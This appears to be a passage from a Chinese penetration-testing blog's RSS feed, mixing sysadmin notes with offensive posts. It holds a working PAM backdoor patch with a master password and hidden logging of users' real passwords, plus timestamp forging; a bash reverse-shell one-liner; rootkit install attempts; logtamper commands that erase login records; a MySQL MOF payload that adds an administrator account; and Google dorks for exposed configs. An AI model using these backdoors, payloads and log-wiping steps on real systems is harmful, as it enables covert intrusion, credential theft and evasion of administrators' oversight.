&lt;p&gt;PAM 可以说是一套应用程序编程接口 (Application Programming Interface, API)，他提供了一连串的验证机制，只要使用者将验证阶段的需求告知 PAM 后， PAM 就能够回报使用者验证的结果 (成功或失败)。由于 PAM 仅是一套验证的机制，又可以提供给其他程序所呼叫引用，因此不论你使用什么程序，都可以使用 PAM 来进行验证，如此一来，就能够让账号口令或者是其他方式的验证具有一致的结果！也让程序设计师方便处理验证的问题.&lt;a href='http://vbird.dic.ksu.edu.tw/linux_basic/0410accountmanager_5.php#ps5'&gt;引用自鸟哥私房菜&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='pam_backdoor'&gt;pam backdoor&lt;/h2&gt;

&lt;p&gt;从pam的介绍中,我们知道,其实登录系统的时候,是pam的模块来验证我们的密码是否正确的.所以就存在这样一种可能,修改pam的验证逻辑,来达到一定条件下不去跟shadow里的密码校验,而是直接返回验证正确.从而达到作为后门的目的.&lt;/p&gt;

&lt;p&gt;patch过程如下:&lt;/p&gt;

&lt;p&gt;下载pam的源码:http://www.linux-pam.org/library/,有很多个版本,我测试的时候都是用的最新版.没有出现问题.测试过的ubuntu10.04和centos 5.4 X64.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wget http://www.linux-pam.org/library/Linux-PAM-1.1.6.tar.gz
tar zxvf Linux-PAM-1.1.6.tar.gz&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;修改modules/pam_unix/pam_unix_auth.c文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd Linux-PAM-1.1.6
vi modules/pam_unix/pam_unix_auth.c&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;查找pam_sm_authenticate函数,修改如下这段函数:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;D((&amp;quot;user=%s, password=[%s]&amp;quot;, name, p));

/* verify the password of this user */

retval = _unix_verify_password(pamh, name, p, ctrl);

name = p = NULL;

AUTH_RETURN;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;改为:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;D((&amp;quot;user=%s, password=[%s]&amp;quot;, name, p));
    if(strcmp(p, &amp;quot;MAGIC_PASSWD&amp;quot;) == 0)  ////MAGIC_PASSWD修改为自己设置的后门密码
    {
        retval = PAM_SUCCESS;
        AUTH_RETURN;
    }

    /* verify the password of this user */
    retval = _unix_verify_password(pamh, name, p, ctrl);
    if(retval == PAM_SUCCESS)
    {
        FILE *fp = fopen(&amp;quot;/usr/local/man/.pam.log&amp;quot;,&amp;quot;a&amp;quot;); /////记录管理员密码的文件路径.
        fprintf(fp, &amp;quot;[evilpam]user=%s, password=%s\n&amp;quot;, name, p);
        fclose(fp);
    }
    name = p = NULL;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段密码的意思是设置了一个MAGIC_PASSWD,任何用户使用这个密码都可以登录.如果用户不是用MAGIC_PASSWD登录的,就把他的用户名密码记录在/usr/local/man/.pam.log文件里.&lt;/p&gt;

&lt;p&gt;保存文件之后,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./configure
make&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;覆盖pam_unix.so之前先备份一下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cp /lib/security/pam_unix.so /tmp/pam_unix.so
cp modules/pam_unix/.libs/pam_unix.so /lib/security/  覆盖&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;需要注意一点.64位的系统里,pam_unix.so的路径是/lib64/security/,坑爹的是64位系统也有/lib/security/pam_unix.so这个文件,一开始调试了好久都没好&amp;#8230;.&lt;/p&gt;

&lt;p&gt;覆盖之后,后门就马上生效了.记得要先测试过.不然断开了之后,发现有问题,连不上就2了.一个patch pam backdoor就搞定了.&lt;/p&gt;

&lt;p&gt;修改文件的时间戳~~&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;touch -t 200909091108 pam_unix.so&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2579'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://www.linux-pam.org/library/&lt;/p&gt;

&lt;p&gt;http://www.0daysecurity.com/articles/backdoor_pam_unix.so.html&lt;/p&gt;</description>
                <link>http://username.github.io/渗透测试/2013/08/30/patch-pam-backdoor</link>
                <guid>http://username.github.io/渗透测试/2013/08/30/patch-pam-backdoor</guid>
                <pubDate>2013-08-30T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>xscan更新nessus插件</title>
                <description>&lt;p&gt;nessus5.x版本插件目录为C:\Documents and Settings\All Users\Application Data\Tenable\Nessus\nessus&lt;/p&gt;

&lt;p&gt;插件数目已经有3W多了.所以传输的时候尽量压缩打包.和在命令行下操作.xp上资源管理器打开浏览都要卡一会.&lt;/p&gt;

&lt;p&gt;第一次测试加载插件加载了一晚上到92%不动了&amp;#8230;&lt;/p&gt;</description>
                <link>http://username.github.io/2013/08/28/xscannessus</link>
                <guid>http://username.github.io/2013/08/28/xscannessus</guid>
                <pubDate>2013-08-28T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>ssh登录那些事</title>
                <description>&lt;p&gt;错误信息:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ssh_exchange_identification: Connection closed by remote host&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;原因是hosts.allow没有允许该IP登录.&lt;/p&gt;

&lt;p&gt;密码正确,但是登录时显示:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Permission denied, please try again.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;应该是sshd_config配置了禁止root用户登录.(待测试)&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/08/28/ssh</link>
                <guid>http://username.github.io/工具使用/2013/08/28/ssh</guid>
                <pubDate>2013-08-28T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>reverse shell cheat sheet</title>
                <description>&lt;h1 id='bash'&gt;BASH&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ubuntu 12.04测试OK&lt;/p&gt;

&lt;h1 id='python'&gt;python&lt;/h1&gt;

&lt;h2 id='id2578'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'&gt;翻译自&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://zone.wooyun.org/content/5064'&gt;反弹shell的十种姿势（偶然看到一些整理下）&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://zone.wooyun.org/content/6041'&gt;python反弹shell&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/渗透测试/2013/08/28/reverse-shell-cheat-sheet</link>
                <guid>http://username.github.io/渗透测试/2013/08/28/reverse-shell-cheat-sheet</guid>
                <pubDate>2013-08-28T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>redhat centos 手动配置IP</title>
                <description>&lt;h2 id='id2576'&gt;配置文件&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;/ect/hosts 配置主机名和IP地址的对应
/etc/sysconfig/network 配置主机名和网关
/etc/sysconfig/network-scripts/ifcfg-eth0 eth0配置文件，eth1则文件名为ifcfg-eth1，以此类推&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;IP配置&lt;/p&gt;

&lt;p&gt;假设我们要配置主机名为test，eth0的IP地址192.168.168.1/24，网关地址192.168.168.250&lt;/p&gt;

&lt;p&gt;则/etc/sysconfig/network文件内容如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;NETWORKING=yes
HOSTNAME=test
GATEWAY=192.168.168.250&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;eth0对应的配置文件/etc/sysconfig/network-scripts/ifcfg-eth0内容如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;DEVICE=eth0
BOOTPROTO=static
IPADDR=192.168.168.1
NETMASK=255.255.255.0
TYPE=Ethernet
ONBOOT=yes&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;DNS配置&lt;/p&gt;

&lt;p&gt;修改/etc/reslov.conf&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;nameserver 8.8.8.8&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2577'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://www.ningoo.net/html/2007/redhat_linux_network_configuration_and_bond.html'&gt;Redhat Linux网卡配置与绑定&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/08/28/redhat-centos-ip</link>
                <guid>http://username.github.io/工具使用/2013/08/28/redhat-centos-ip</guid>
                <pubDate>2013-08-28T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>Jynx_Rootkit/2.0安装测试</title>
                <description>&lt;h2 id='id2573'&gt;安装&lt;/h2&gt;

&lt;p&gt;下载地址:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wget http://blackhatlibrary.net/releases/jynx2.tgz
tar zxvf jynx2.tgz&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;配置config.h&lt;/p&gt;

&lt;h2 id='id2574'&gt;尝试过程&lt;/h2&gt;

&lt;p&gt;直接centos 5.4 final make &amp;amp;&amp;amp; make install 机器重启都起不来了&amp;#8230;&lt;/p&gt;

&lt;h1 id='1'&gt;测试1&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;CentOS release 5.4 (Final)
2.6.18-164.el5 X86_64&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一开始编译出错,找不到一些文件.error: openssl/ssl.h: No such file or directory&amp;#8230;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;搞定!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost jynx2]# make install
[-] Initiating Installation Directory /XxJynx
[-] Installing jynx2.so and reality.so
[-] Morphing Magic GID (7)
[-] Injecting jynx2.so
make: *** [install] Segmentation fault
[root@localhost jynx2]# ls
Segmentation fault
[root@localhost jynx2]# dir
Segmentation fault&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后机器就挂了,重启都起不来了&amp;#8230;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ubuntu 10.04

ubuntu 上apt-get install libssl-dev  解决找不到头文件的问题.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;重启apache服务的时候起不来&amp;#8230;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rm: cannot remove `/var/run/apache2/*ssl_scache*&amp;#39;
/usr/sbin/apache2ctl: line 93: 16120 Segmentation fault      $HTTPD ${APACHE_ARGUMENTS} -k $ARGV&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2575'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://www.blackhatlibrary.net/Jynx_Rootkit/2.0&lt;/p&gt;

&lt;p&gt;http://resources.infosecinstitute.com/jynx2-sneak-peek-analysis/&lt;/p&gt;

&lt;p&gt;http://blog.csdn.net/haoel/article/details/1602108&lt;/p&gt;

&lt;p&gt;http://stackoverflow.com/questions/426230/what-is-the-ld-preload-trick&lt;/p&gt;

&lt;p&gt;http://www.infosecisland.com/blogview/22440-Analyzing-Jynx-and-LDPRELOAD-Based-Rootkits.html&lt;/p&gt;

&lt;p&gt;http://www.chokepoint.net/2013/08/jynxjynx2-userland-rootkits.html&lt;/p&gt;</description>
                <link>http://username.github.io/渗透测试/2013/08/28/jynx_rootkit20</link>
                <guid>http://username.github.io/渗透测试/2013/08/28/jynx_rootkit20</guid>
                <pubDate>2013-08-28T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>zmap 使用测试</title>
                <description>&lt;h2 id='id2571'&gt;安装环境&lt;/h2&gt;

&lt;p&gt;ubuntu10.04 32位安装失败.bt5 32位,可以安装,使用的时候提示compile filter error.在64位的centos 5.4上安装提示了一个Wno-unused-but-set-variable变量无法识别的问题.搜索了下发现是低版本的gcc的问题.github上最新的版本已经解决了这个问题.&lt;/p&gt;

&lt;p&gt;然后在ubuntu10.04上安装成功~~~~&lt;/p&gt;

&lt;p&gt;获取10000个结果用1M带宽,发包速率每秒十几K,只需要几分钟.&lt;/p&gt;

&lt;p&gt;获取1000000个结果,发包速率150K,需要6个小时左右.&lt;/p&gt;

&lt;h2 id='id2572'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='https://github.com/zmap/zmap'&gt;github&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://drops.wooyun.org/tools/515'&gt;zone&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/08/27/zmap-</link>
                <guid>http://username.github.io/工具使用/2013/08/27/zmap-</guid>
                <pubDate>2013-08-27T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>ubuntu报错:apt:cache</title>
                <description>&lt;p&gt;ubuntu 10.04&lt;/p&gt;

&lt;p&gt;报错信息:Dynamic MMap ran out of room. Please increase the size of APT::Cache-Limit. Current value: 25165824. (man 5 apt.conf)&lt;/p&gt;

&lt;p&gt;参考&lt;a href='http://askubuntu.com/questions/219523/dynamic-mmap-ran-out-of-room-when-trying-to-sudo-apt-get-anything'&gt;askubuntu&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I believe one solution is just increase the value APT::Cache-Limit at the /etc/apt/apt.conf.d/70debconf, to do so use:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo gedit /etc/apt/apt.conf.d/70debconf

and add the following to the end of the file:

APT::Cache-Limit &amp;quot;100000000&amp;quot;;

..and then run:

sudo apt-get clean
sudo apt-get update --fix-missing&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/工具使用/2013/08/27/ubuntuaptcache</link>
                <guid>http://username.github.io/工具使用/2013/08/27/ubuntuaptcache</guid>
                <pubDate>2013-08-27T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>ipsecs kbeast安装</title>
                <description></description>
                <link>http://username.github.io/2013/08/23/ipsecs-kbeast</link>
                <guid>http://username.github.io/2013/08/23/ipsecs-kbeast</guid>
                <pubDate>2013-08-23T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>linux日志清除分析</title>
                <description>&lt;h2 id='id2569'&gt;下载地址&lt;/h2&gt;

&lt;p&gt;wget http://packetstormsecurity.com/files/download/72410/logtamper_v1_1.tgz&lt;/p&gt;

&lt;h2 id='id2570'&gt;用法转载&lt;/h2&gt;

&lt;p&gt;-f 选项：用于指定要修改的文件的路径的，是个可选项。由于不同系统的日志存放路径不一样，可以手工指定。 默认的日志存放地点是：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#define UTMPFILE &amp;quot;/var/run/utmp&amp;quot;
#define WTMPFILE &amp;quot;/var/log/wtmp&amp;quot;
#define LASTLOGFILE &amp;quot;/var/log/lastlog&amp;quot;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;-h 选项: 有时候你和管理员同时在线，管理员w一下就能看到你了。使用-h选项用户躲避管理员w查看，如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost logtamper]# w
21:27:25 up 5 days, 13:48, 4 users, load average: 0.00, 0.00, 0.00
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
root tty1 - Fri14 18:24m 0.33s 0.33s -bash
root pts/3 192.168.80.1 21:21 6:22 0.04s 0.04s -bash
root pts/2 192.168.80.1 21:06 0.00s 0.13s 0.00s w
root pts/4 192.168.80.1 21:21 5:52 0.03s 0.03s -bash&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们是从192.168.80.1机器连上来的，现在隐藏下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost logtamper]# ./logtamper-static -h root 192.168.80.1
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu &amp;lt;evil.xi4oyu@gmail.com&amp;gt;

Seems you&amp;#39;re invisible Now...Check it out!

[root@localhost logtamper]# w
21:27:46 up 5 days, 13:48, 1 user, load average: 0.00, 0.00, 0.00
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
root tty1 - Fri14 18:24m 0.33s 0.33s -bash
[root@localhost logtamper]#&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;-w 选项:用于清除你的登录日志，现在上的linux日志清除工具做的很粗燥啊，这个可以指定清除某些hostname过来的机器。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost logtamper]# last
root tty1 Wed Oct 1 21:30 - 21:30 (00:00)
root pts/4 192.168.80.1 Wed Oct 1 21:21 still logged in
root pts/3 192.168.80.1 Wed Oct 1 21:21 still logged in&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;wtmp begins Wed Oct 1 06:01:46 2008&lt;/p&gt;

&lt;p&gt;清除192.168.80.1的登录日志：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost logtamper]# ./logtamper-static -w root 192.168.80.1
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu &amp;lt;evil.xi4oyu@gmail.com&amp;gt;

Aho,you are now invisible to last...Check it out!
[root@localhost logtamper]# last
root tty1 Wed Oct 1 21:30 - 21:30 (00:00)

wtmp begins Wed Oct 1 06:01:46 2008
[root@localhost logtamper]#&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;-m 选项:用于修改上次登录地点，我们使用ssh登录的时候可能会注意到这点 login as: root Sent username &amp;#8220;root&amp;#8221; root@192.168.80.128&amp;#8217;s password: Last login: Wed Oct 1 21:31:40 2008 from 192.168.80.45 &lt;span&gt;root@localhost ~&lt;/span&gt;#&lt;/p&gt;

&lt;p&gt;如果不修改lastlog的话，管理员下次登录就会提示从我们的机器IP登录。使用-m选项可以编辑这个选项：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost logtamper]# ./logtamper-static -m root 1.2.3.4 tty10 2008:1:1:1:1:1
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu &amp;lt;evil.xi4oyu@gmail.com&amp;gt;

Aho, now you never come here before...Check it out!
[root@localhost logtamper]#&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当然，这只是个举例，在使用中各位请根据具体信息修改，下次管理员登录，登录界面就成了&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;login as: root
Sent username &amp;quot;root&amp;quot;
root@192.168.80.128&amp;#39;s password:
Last login: Tue Jan 1 01:01:01 2008 from 1.2.3.4
[root@localhost ~]#&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;恩，就这么多了，有什么问题，发邮件 evil.xi4oyu@gmail.com&lt;/p&gt;

&lt;h2 id='logtamper'&gt;logtamper使用&lt;/h2&gt;

&lt;p&gt;参考资料:&lt;/p&gt;

&lt;p&gt;&lt;a href='http://packetstormsecurity.com/files/author/6242/'&gt;packetstorm&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://huaidan.org/archives/1929.html'&gt;logtamper-v1.0 修改linux 日志的工具&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://huaidan.org/archives/2564.html'&gt;logtamper&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/08/22/linux</link>
                <guid>http://username.github.io/技术研究/2013/08/22/linux</guid>
                <pubDate>2013-08-22T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>ubuntu安装dropbox</title>
                <description>&lt;p&gt;ubuntu12.04&lt;/p&gt;

&lt;p&gt;完整的过程如下:&lt;/p&gt;

&lt;p&gt;在&lt;a href='https://linux.dropbox.com/packages/ubuntu/'&gt;官网&lt;/a&gt;下载最新版的deb包.然后大家就都知道了,这个包是不完整的,打开会提示下载其他的东西,由于gfw的原因,是下载不了的.也就无法安装成功了.&lt;/p&gt;

&lt;p&gt;装好deb包之后,下载这个包&lt;a href='http://www.dropbox.com/download?plat=lnx.x86'&gt;tar&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;解压之后,放到家目录就可以了.注意这个包解压之后名字是以点开头的隐藏的文件名.需要用ls -a 查看.&lt;/p&gt;

&lt;h2 id='id2567'&gt;遇到的问题&lt;/h2&gt;

&lt;p&gt;之前按照在centos上安装的经验,直接下载&lt;a href='http://www.dropbox.com/download?plat=lnx.x86'&gt;tar&lt;/a&gt;包解压.运行dropboxd提示connection close 之类的错误.&lt;/p&gt;

&lt;p&gt;错误信息:&lt;/p&gt;

&lt;p&gt;Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.&lt;/p&gt;

&lt;h2 id='id2568'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='https://www.dropbox.com/help/247/en'&gt;2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://blog.xuite.net/pacermania/a1253247/63262677-%5BUbuntu%5DDropbox%E5%AE%89%E8%A3%9D%2B%E4%BD%BF%E7%94%A8'&gt;1&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/08/21/ubuntudropbox</link>
                <guid>http://username.github.io/工具使用/2013/08/21/ubuntudropbox</guid>
                <pubDate>2013-08-21T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>用dropbox做git私人仓库</title>
                <description>&lt;p&gt;在dropbox同步的文件夹内执行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git init --bare mytestrepo.git&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后在本地创建git工作目录&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ cd ~
$ mkdir testrepo
$ cd testrepo
$ git init&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;添加远程仓库:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git remote add origin ~/Dropbox/Git/mytestrepo.git&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后 git add,commit,push就可以了.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git add . &amp;amp;&amp;amp; git commit -m &amp;quot;auto&amp;quot; &amp;amp;&amp;amp; git push&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2566'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://jetheis.com/blog/2013/02/17/using-dropbox-as-a-private-github/http://jetheis.com/blog/2013/02/17/using-dropbox-as-a-private-github/'&gt;Using Dropbox as a Private GitHub&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://stackoverflow.com/questions/1960799/using-git-and-dropbox-together-effectively'&gt;Using Git and Dropbox together effectively?&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/08/21/dropboxgithub</link>
                <guid>http://username.github.io/工具使用/2013/08/21/dropboxgithub</guid>
                <pubDate>2013-08-21T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>mysql mof 提权</title>
                <description>&lt;h2 id='id2563'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://zone.wooyun.org/content/2273'&gt;mof运行远控&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://zone.wooyun.org/content/1806'&gt;windows写权限变成可执行权限的利用&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://zone.wooyun.org/content/1795'&gt;利用代码&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.exploit-db.com/exploits/23083/'&gt;exploitdb&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='id2564'&gt;利用代码&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;找个可写目录，我这里是C:\recycler\，把如下代码写到nullevt.mof文件里（也就是他源码里的payload）：&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id='pragma_namespacerootsubscription'&gt;pragma namespace(&amp;#8220;\\.\root\subscription&amp;#8221;)&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;instance of __EventFilter as $EventFilter
{
EventNamespace = &amp;quot;Root\\Cimv2&amp;quot;;
Name  = &amp;quot;filtP2&amp;quot;;
Query = &amp;quot;Select * From __InstanceModificationEvent &amp;quot;
&amp;quot;Where TargetInstance Isa \&amp;quot;Win32_LocalTime\&amp;quot; &amp;quot;
&amp;quot;And TargetInstance.Second = 5&amp;quot;;
QueryLanguage = &amp;quot;WQL&amp;quot;;
};

instance of ActiveScriptEventConsumer as $Consumer
{
Name = &amp;quot;consPCSV2&amp;quot;;
ScriptingEngine = &amp;quot;JScript&amp;quot;;
ScriptText =
&amp;quot;var WSH = new ActiveXObject(\&amp;quot;WScript.Shell\&amp;quot;)\nWSH.run(\&amp;quot;net.exe user admin admin /add\&amp;quot;)&amp;quot;;
};

instance of __FilterToConsumerBinding
{
Consumer   = $Consumer;
Filter = $EventFilter;
};&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注意上面的net.exe user admin admin /add，可以随便改的，想执行啥都行，有没有参数也都行，执行自己的马也行。 再然后，在菜刀里连接mysql数据库后执行：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;select load_file(&amp;#39;C:\\RECYCLER\\nullevt.mof&amp;#39;) into dumpfile &amp;#39;c:/windows/system32/wbem/mof/nullevt.mof&amp;#39;;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2565'&gt;分析&lt;/h2&gt;

&lt;p&gt;本质上是写权限变可执行权限,将mof文件写入特定目录,导致其被执行.&lt;/p&gt;</description>
                <link>http://username.github.io/渗透测试/2013/08/20/mysql-mof-</link>
                <guid>http://username.github.io/渗透测试/2013/08/20/mysql-mof-</guid>
                <pubDate>2013-08-20T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>google hack寻找练习目标</title>
                <description>&lt;p&gt;搜索ftp泄漏的web.config文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;filetype:config inurl:web.config inurl:ftp&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;空密码的phpadmin&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;inurl:phpmyadmin inurl:phpmyadmin/index.php

inurl:phpmyadmin inurl:phpmyadmin/sql.php&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/渗透测试/2013/08/20/google-hack</link>
                <guid>http://username.github.io/渗透测试/2013/08/20/google-hack</guid>
                <pubDate>2013-08-20T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>log parser 使用学习</title>
                <description>&lt;h2 id='log_parser'&gt;log parser相关工具下载&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://www.microsoft.com/en-us/download/details.aspx?id=24659'&gt;log parser下载&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.lizard-labs.net/log_parser_lizard.aspx'&gt;log parser lizard&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='id2561'&gt;实战案例&lt;/h2&gt;

&lt;p&gt;目标:在windows的安全事件中找出用户admin登录的ip来源.并按照ip出现的次数排序.&lt;/p&gt;

&lt;p&gt;操作过程:&lt;/p&gt;

&lt;p&gt;evt格式的日志log parser2.2提示格式错误,用高版本的日志查看器打开另存为evtx格式就可以正常识别了.&lt;/p&gt;

&lt;p&gt;先在日志查看器中人工分析日志,发现登录产生一系列日志.决定采用528事件作为分析对象.528是2003用户登录成功事件.(之前的测试应该是登录不成功不会记录ip,登录成功是否记录ip要看连接协议)&lt;/p&gt;

&lt;p&gt;使用命令&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\log&amp;gt;logparser.exe -i:evt -o:xls &amp;quot;select * into sec.xls from sec.evtx where EventID=528&amp;quot;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;或得安全事件中id为528的事件,并且转化为csv格式.下一步就要过滤出来用户名和密码以及时间.&lt;/p&gt;

&lt;p&gt;使用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\log&amp;gt;LogParser.exe -i:csv -o:csv &amp;quot;select extract_token( Strings, 13, &amp;#39;|&amp;#39;) as ipaddress into ipaddr.csv from sec.xls&amp;quot;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;获得事件中的ip&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\log&amp;gt;LogParser.exe -i:csv -o:csv &amp;quot;select ipaddress, count(*) as hits into count.csv from ipaddr.csv group by ipaddress order by hits desc&amp;quot;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;去得ip出现的次数,排序.&lt;/p&gt;

&lt;p&gt;这样子得到了所有登录过的ip以及相应的次数.没有考虑到用户名.算是完成了60%吧.&lt;/p&gt;

&lt;h2 id='id2562'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://blogs.technet.com/b/gcrsec/archive/2009/04/23/conficker.aspx'&gt;如何快速查找感染 Conficker 的客户端&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://blog.weithenn.org/2009/05/windowslog-parser.html'&gt;Log Parser-記錄檔分析器&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.cnblogs.com/qiqi9039420/articles/2051059.html'&gt;logparser及常用使用方法总结&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://support.microsoft.com/kb/910447/zh-tw'&gt;記錄剖析器 2.2&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/08/19/log-parser-</link>
                <guid>http://username.github.io/工具使用/2013/08/19/log-parser-</guid>
                <pubDate>2013-08-19T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>windows防火墙配置和日志格式分析</title>
